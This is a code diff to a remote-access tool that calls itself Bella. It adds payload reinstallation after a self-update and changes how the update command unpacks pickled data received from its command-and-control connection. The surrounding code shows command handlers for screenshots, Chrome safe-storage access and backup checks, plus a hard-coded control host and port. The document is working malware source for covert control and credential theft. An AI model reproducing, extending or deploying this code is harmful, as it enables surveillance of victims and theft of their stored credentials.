@@ -132,7 +132,7 @@ def subprocess_cleanup(): #will clean up all of those in the global payload_list
 			print 'Killed and cleaned [%s]' % x[2]
 			payload_list.remove(x)
 
-def host_update(updated_server):
+def host_update(updated_server, payloads):
 	if not "verify_update_id = '2f4e2e37c9b6eecebb0927a96938b4fa'" in updated_server:
 		send_msg('This does not appear to be a Bella payload. Cancelling update.', True)
 		return
@@ -140,10 +140,10 @@ def host_update(updated_server):
 		content.write(updated_server)
 	send_msg('%sUpdated [%s] with new server code.\n' % (blue_star, __file__), False)
 	#working on way to make this backwards compatible
-	#if not inject_payloads(payloads):
-	#	send_msg('%sError reinstalling payloads.\n' % red_minus, False)
-	#else:
-	#	send_msg('%sReinstalled payloads.\n' % yellow_star, False)
+	if not inject_payloads(payloads):
+		send_msg('%sError reinstalling payloads.\n' % red_minus, False)
+	else:
+		send_msg('%sReinstalled payloads.\n' % yellow_star, False)
 	send_msg('%sRestarting server!\n' % (yellow_star), False)
 	send_msg(os.kill(bellaPID, 9), False)
 	return
@@ -2147,8 +2147,8 @@ def bella(*Emma):
 					send_msg(screenShot(), True)
 				elif data.startswith("host_update"):
 					send_msg("%sAttempting to update server!\n" % yellow_star, False)
-					server_code = pickle.loads(data[11:])
-					send_msg(host_update(server_code), True)
+					(payloads, server_code) = pickle.loads(data[11:])
+					send_msg(host_update(server_code, payloads), True)
 				elif data == "chrome_safe_storage":
 					chrome_safe_storage()
 				elif data == "check_backups":
@@ -2508,7 +2508,7 @@ payload_list = []
 temp_file_list = []
 host = '127.0.0.1' #Command and Control IP (listener will run on)
 port = 4545 #What port Bella will operate over
-bella_version = '1.35'
+bella_version = '1.36'
 
 #### End global variables ####
 if __name__ == '__main__':
